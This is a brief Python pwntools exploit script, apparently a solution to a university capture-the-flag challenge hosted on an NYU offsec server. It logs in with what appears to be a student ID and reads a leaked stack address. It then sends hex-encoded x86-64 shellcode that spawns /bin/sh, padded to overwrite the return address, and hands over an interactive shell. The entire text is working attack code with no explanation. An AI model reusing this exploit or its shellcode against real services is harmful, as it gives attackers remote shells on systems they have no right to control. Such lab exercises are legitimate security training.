from pwn import *

#p = process("./school")

p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1338)
p.recvuntil(":")
p.sendline("jd3846")
p.recvline()
data = str(p.recv())
addr = data.find("0x")
rsp = data[addr:addr+14]
print rsp
shc = \
'4883ec2031c048bbd19d9691d08c97ff' \
'48f7db53545f995257545eb0' \
'3b0f05'.decode('hex')
exploit = shc.ljust(0x28, 'A') + p64(int(rsp, 16))   

p.sendline(exploit)
#gdb.attach(p)

print "Enjoy your shell!"
p.interactive()
